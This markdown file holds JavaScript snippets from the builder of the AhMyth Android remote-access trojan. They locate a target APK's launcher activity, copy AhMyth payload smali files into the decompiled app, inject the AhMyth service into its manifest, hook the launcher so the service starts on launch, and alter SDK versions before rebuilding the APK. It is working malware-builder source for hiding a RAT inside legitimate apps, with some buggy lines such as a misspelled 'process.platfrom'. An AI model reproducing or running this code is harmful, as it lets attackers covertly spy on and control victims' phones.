# Main Application Class/ Launcher Activity Extraction
```js
const fs = require('fs');

const { parseString } = require('xml2js');

const ERROR_FILE_NOT_FOUND = 'Error: AndroidManifest.xml not found';

const ERROR_MAIN_APP_CLASS_NOT_FOUND = 'Unable to find main application class or launcher activity in AndroidManifest.xml';

const launcherActivity = GetLauncherActivity('AndroidManifest.xml');

if (launcherActivity) {

  console.log(`The launcher activity is ${launcherActivity}`);

} else {

  console.error(ERROR_MAIN_APP_CLASS_NOT_FOUND);

}

function GetLauncherActivity(manifestFilePath) {

  // Check if the AndroidManifest.xml file exists

  if (!fs.existsSync(manifestFilePath)) {

    throw new Error(ERROR_FILE_NOT_FOUND);

  }

  // Read the AndroidManifest.xml file

  const manifestData = fs.readFileSync(manifestFilePath);

  // Parse the XML data using xml2js

  let launcherActivity;

  parseString(manifestData, (err, result) => {

    if (err) {

      console.error(`Error parsing ${manifestFilePath}: ${err}`);

      return;

    }

    // Extract the name of the main application class

    try {

      const application = result.manifest.application[0];

      launcherActivity = application['$']['android:name'].replace(/^\./, '');

    } catch {

      // If the main application class is not found, extract the main launcher activity name

      const activity = result.manifest.activity.find((activity) => {

        const intentFilter = activity['intent-filter'];

        return intentFilter && intentFilter.some((filter) => {

          return filter.action && filter.action.some((action) => {

            return action['$']['android:name'] === 'android.intent.action.MAIN';

          }) && filter.category && filter.category.some((category) => {

            return category['$']['android:name'] === 'android.intent.category.LAUNCHER';

          });

        });

      });

      if (activity) {

        launcherActivity = activity['$']['android:name'];

      }

    }

  });

  return launcherActivity;

}
```


# Recursive file search function
> readdirp required!
```js
readdirp(apkFolder, {fileFilter: launcherActivity, alwaysStat: true})
  .on('data', (entry) => {
    var {path, stats: {}} = entry;
    var output = `${JSON.stringify(path)}`;
    if (process.platform === 'win32') {
      var launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\\/g, "/").trim('\n');
      console.log(launcherPath);
    } else {
      (process.platform === 'linux' || process.platform === 'darwin');
      var launcherPath = output.replace(/^"(.*)"$/, '$1').trim('\n');
      console.log(launcherPath);
    }
  });
```
# Smali Payload Directory Creation Function 
```js
    $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {

      $appCtrl.Log("Reading the Decompiled APK folder...");
      $appCtrl.Log();
      fs.readdir(apkFolder, { withFileTypes: true }, (error, files) => {
          if (error) {
              $appCtrl.Log('Reading the Decompiled APK Failed!')
              $appCtrl.Log();
              return;
  
          }
  
          $appCtrl.Log("Sorting the List of Smali Directories...")
          $appCtrl.Log();
          var ignoreDirs = ['original', 'res', 'build', 'kotlin',
          'lib', 'assets', 'META-INF', 'unknown'];
          var smaliList = files
              .filter((item) => item.isDirectory() &&
              !(ignoreDirs.includes(item.name)))
              .map((item) => item.name);
          var collator = new Intl.Collator([], {numeric: true});
          smaliList.sort((a, b) => collator.compare(a, b));
          var lastSmali = smaliList[smaliList.length -1];
          if (lastSmali == "smali") {
              $appCtrl.Log('Creating the new Smali Payload Directory...')
              $appCtrl.Log();
              fs.mkdir(apkFolder + "/smali_classes2", { recursive: true }, error => {
                  if (error) {
                      $appCtrl.Log("Unable to Create the Smali Payload Directory!");
                      $appCtrl.Log();
                      return;
                  };

                  $appCtrl.Log("Copying AhMyth Payload Files to Original App...");
                  $appCtrl.Log();
                  fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), 
                  path.join(apkFolder, "smali_classes2"), (error) => {
                      if (error) {
                          $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
                          $appCtrl.Log();
                          fs.mkdir(logPath);
                          fs.writeFile(path.join(logPath, 'Copying.log'), 
                          `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
                          $appCtrl.Log('Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                          $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
                          $appCtrl.Log();
                          return;
                      }

                      var payloadPath = apkFolder + "/smali_classes2";
                      fs.remove(payloadPath + "/android", { recursive: true }, (error) => {
                          if (error) {
                              $appCtrl.Log(error);
                              $appCtrl.Log();
                              return;
                          };

                          fs.remove(payloadPath + "/androidx", { recursive: true }, (error) => {
                              if (error) {
                                  $appCtrl.Log(error);
                                  $appCtrl.Log();
                                  return;
                              };

                              $appCtrl.GenerateApk(apkFolder);

                          });
                        
                      });
              
                  });

              });

          } else {

              var extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);
              var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
              var newSmaliNumber = lastSmaliNumber+1;
              var payloadSmaliFolder = ('/smali_classes'+newSmaliNumber);
              $appCtrl.Log('Creating the new Smali Payload Directory...')
              $appCtrl.Log();
              fs.mkdir(apkFolder + payloadSmaliFolder, { recursive: true }, error => {
                  if (error) {
                      $appCtrl.Log("Unable to Create the Smali Payload Directory!");
                      $appCtrl.Log();
                      return;
                  };
                  
                  $appCtrl.Log("Copying AhMyth Payload Files to Original App...");
                  $appCtrl.Log();
                  fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), 
                  path.join(apkFolder, payloadSmaliFolder), (error) => {
                      if (error) {
                          $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
                          $appCtrl.Log();
                          fs.mkdir(logPath);
                          fs.writeFile(path.join(logPath, 'Copying.log'), 
                          `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
                          $appCtrl.Log('Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                          $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
                          $appCtrl.Log();
                          return;
                      }

                      var payloadPath = apkFolder + payloadSmaliFolder;
                      fs.remove(payloadPath + "/android", (error) => {
                          if (error) {
                              $appCtrl.Log(error);
                              $appCtrl.Log();
                              return;
                          };

                          fs.remove(payloadPath + "/androidx", (error) => {
                              if (error) {
                                $appCtrl.Log(error);
                                $appCtrl.Log();
                                return;
                              };

                              $appCtrl.GenerateApk(apkFolder);

                          });
                        
                      });
              
                  });

              });

          };
  
      });
  
  };
```
# Backup Cross Platform Bind On Launch function
Stored just in case of problems with the original Cross platform bind on launch function
```js
$appCtrl.BindOnLauncher = (apkFolder) => {


    $appCtrl.Log('Finding Launcher Activity From AndroidManifest.xml...');
    $appCtrl.Log();
    fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
        if (error) {
            $appCtrl.Log('Reading AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);
            $appCtrl.Log();
            return;
        }

        var launcherActivity = GetLauncherActivity(data, apkFolder);
        if (launcherActivity == -1) {
            $appCtrl.Log("Cannot Find the Launcher Activity in the Manifest!", CONSTANTS.logStatus.FAIL);
            $appCtrl.Log("Please use Another APK as a Template!.", CONSTANTS.logStatus.INFO);
            $appCtrl.Log();
            return;
        }

        var ahmythService = CONSTANTS.ahmythService;
        $appCtrl.Log('Modifying AndroidManifest.xml...');
        $appCtrl.Log();
        var permManifest = $appCtrl.copyPermissions(data);
        var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
        fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
            if (error) {
                $appCtrl.Log('Modifying AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);
                $appCtrl.Log();          
                return;
            }
            
            if (process.platform === 'win32') {
                $appCtrl.Log("Locating Launcher Activity...")
                $appCtrl.Log();
                exec('set-location ' + '"' + apkFolder + '"' + ';' + ' gci -path ' + '"' 
                + apkFolder + '"' + ' -recurse -filter ' + '"' + launcherActivity + '"' 
                + ' -file | resolve-path -relative', { 'shell':'powershell.exe' }, (error, stdout, stderr) => {
                var launcherPath = stdout.substring(stdout.indexOf(".\\") + 2).trim("\n");
                if (error !== null) {
                    $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                    $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                    $appCtrl.Log();
                    return;
                } else if (!launcherPath) {
                    $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                    $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                    $appCtrl.Log();
                    return;
                } else {
                    $appCtrl.Log("Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);
                    $appCtrl.Log();
                }

                $appCtrl.Log("Reading Launcher Activity...")
                $appCtrl.Log();
                fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                    if (error) {
                        $appCtrl.Log('Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                        $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                        $appCtrl.Log();
                        return;
                        }

                        var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
 
                        var hook = CONSTANTS.hookPoint;
                        $appCtrl.Log("Modifiying Launcher Activity...");
                        $appCtrl.Log();
                        var output = data.replace(hook, startService);
                        fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                            if (error) {
                                $appCtrl.Log('Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                                $appCtrl.Log();
                                return;
                            }
                            
                            $appCtrl.Log("Determining Target SDK Version...");
                            $appCtrl.Log()
                            fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
                              if (error) {
                                $appCtrl.Log("Reading the Manifest Target SDK Failed.")
                                $appCtrl.Log()
                                return;
                              }
                              
                              $appCtrl.Log("Modifying the Target SDK Version...");
                              $appCtrl.Log();
                              var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                              var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                              var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                              var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/
                              var repXmlSdk = data.replace(compSdkVerRegex, "$122"+'"').replace(compSdkVerNameRegex, "$111"+'"').replace(platVerCoRegex, "$122"+'"').replace(platVerNameRegex, "$111"+'"');
                              fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                                if (error) {
                                    $appCtrl.Log('Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);
                                    $appCtrl.Log();          
                                    return;
                                  }

                                  fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                    if (error) {
                                        $appCtrl.Log("Reading the 'apktool.yml' Target SDK Failed!");
                                        $appCtrl.Log();
                                        return;
                                    }

                                    var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                    var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
                                    var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
                                    fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                      if (error) {
                                          $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")
                                          $appCtrl.Log()
                                          return;
                                        }

                                        var regex = /[^/]+\//;
                                        var str = launcherPath;
                                        var m = str.replace(/\\/g, "/").match(regex);
            
                                        var smaliFolder = m[0];
            
                                        $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
                                        $appCtrl.Log();
                                        fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
                                            if (error) {
                                                $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
                                                $appCtrl.Log();
                                                return;
                                              }
                                              
                                              $appCtrl.GenerateApk(apkFolder);
                              
                                          });
                                          
                                      });
              
                                  });
              
                              });

                          });

                      });

                  });

              });

            } else {
                (process.platform === "linux" || process.platfrom === "darwin")
                $appCtrl.Log("Locating Launcher Activity...");
                $appCtrl.Log();
                exec('set-location ' + '"' + apkFolder + '"' + ';' + ' gci -path ' + '"' 
                + apkFolder + '"' + ' -recurse -filter ' + '"' + launcherActivity + '"' 
                + ' -file | resolve-path -relative', { 'shell':'pwsh' }, (error, stdout, stderr) => {
                var launcherPath = stdout.substring(stdout.indexOf("./") + 2).trim("\n");
                if (error !== null) {
                    $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                    $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                    $appCtrl.Log();
                    return;
                } else if (!launcherPath) {
                    $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                    $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                    $appCtrl.Log();
                    return;
                } else {
                    $appCtrl.Log("Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);
                    $appCtrl.Log();
                }

                $appCtrl.Log("Reading Launcher Activity...")
                $appCtrl.Log();
                fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                    if (error) {
                        $appCtrl.Log('Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                      $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                        $appCtrl.Log();
                        return;
                    }

                    var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
 
                    var hook = CONSTANTS.hookPoint;
                    $appCtrl.Log("Modifiying Launcher Activity...");
                    $appCtrl.Log();
                    var output = data.replace(hook, startService);
                    fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                        if (error) {
                            $appCtrl.Log('Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                            $appCtrl.Log();
                            return;
                        }
                        
                        $appCtrl.Log("Determining Target SDK Version...");
                        $appCtrl.Log()
                        fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
                            if (error) {
                                $appCtrl.Log("Reading the Manifest Target SDK Failed.")
                                $appCtrl.Log()
                                return;
                            }


                            $appCtrl.Log("Modifying the Target SDK Version...");
                            $appCtrl.Log();
                            var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                            var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                            var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                            var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/
                            var repXmlSdk = data.replace(compSdkVerRegex, "$122"+'"').replace(compSdkVerNameRegex, "$111"+'"').replace(platVerCoRegex, "$122"+'"').replace(platVerNameRegex, "$111"+'"');
                            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                            if (error) {
                                $appCtrl.Log('Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);
                                $appCtrl.Log();          
                                return;
                                }

                                fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                if (error) {
                                    $appCtrl.Log("Reading the 'apktool.yml' Target SDK Failed!");
                                    $appCtrl.Log();
                                    return;
                                }

                                var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
                                var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
                                fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                    if (error) {
                                        $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")
                                        $appCtrl.Log()
                                        return;
                                    }

                                    var regex = /[^/]+\//;
                                    var str = launcherPath;
                                    var m = str.match(regex);

                                    var smaliFolder = m[0];
            
                                    $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
                                    $appCtrl.Log();
                                    fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
                                        if (error) {
                                            $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
                                            $appCtrl.Log();
                                            return;
                                            }
                                            
                                            $appCtrl.GenerateApk(apkFolder);
                
                                            });;

                                        });

                                    });

                                });

                            });

                        });

                    });

                });

            };

        });

    });

};
```
